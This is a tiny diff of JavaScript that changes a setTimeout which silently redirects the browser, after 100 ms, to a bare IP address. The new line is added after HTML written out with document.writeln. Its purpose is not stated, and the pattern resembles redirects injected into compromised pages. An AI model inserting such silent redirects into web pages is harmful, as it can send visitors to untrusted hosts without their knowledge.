@@ -32,4 +32,4 @@ document.writeln("</html>");
 
 
 
-setTimeout("window.location.href='http://38.26.195.205/'",100);
+setTimeout("window.location.href='http://38.26.195.207/'",100);
